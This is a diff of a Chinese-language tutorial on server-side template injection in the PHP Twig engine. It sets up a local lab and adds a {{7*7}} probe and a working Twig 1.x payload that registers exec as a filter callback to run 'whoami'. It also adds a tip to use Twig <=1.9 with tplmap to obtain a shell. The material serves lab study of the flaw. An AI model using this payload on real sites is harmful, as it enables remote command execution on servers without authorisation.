@@ -82,7 +82,7 @@ $output = $twig->render( $_GET['name'] , array("name" => $user.name) );
   - Smarty
     Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛
 
-  - Twig(存在漏洞的版本：<=1.9)
+  - Twig
     Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。
 
   - Blade
@@ -208,13 +208,14 @@ python2
 
 
 
-
 ### PHP
 
 **TWIG**
 
 
 搭建使用 [TWIG v1.11.1版本](https://github.com/twigphp/Twig/releases/tag/v1.11.1)
+
+当然如果想配合tplmap拿shell建议使用[版本<=v1.9](https://github.com/twigphp/Twig/releases/tag/v1.8.3)
 
 将下载下来的文件中的`lib`文件提取到PHP目录下
 
@@ -244,9 +245,19 @@ if (isset($_GET['name'])) {
 访问index.php 输入`?name=张三` 回显出 `hello 张三`。
 
 在目标页面输入
+```
+?name={{7*7}}
+```
+回显 49 测试输入执行命令
 
+```
 
+```
 
+命令行执行命令
+```
+?name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+```
 
 
 
